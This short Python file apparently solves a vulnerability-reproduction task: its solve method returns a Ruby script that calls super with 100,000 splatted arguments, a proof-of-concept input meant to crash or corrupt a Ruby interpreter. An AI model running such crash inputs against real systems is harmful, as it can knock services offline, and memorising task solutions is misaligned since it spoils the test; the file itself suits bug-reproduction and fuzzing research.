class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "class A\n"
            "  def foo(*args)\n"
            "  end\n"
            "end\n"
            "class B < A\n"
            "  def foo(*args)\n"
            "    super(*args)\n"
            "  end\n"
            "end\n"
            "B.new.foo(*Array.new(100000, 0))\n"
        )
        return poc.encode()
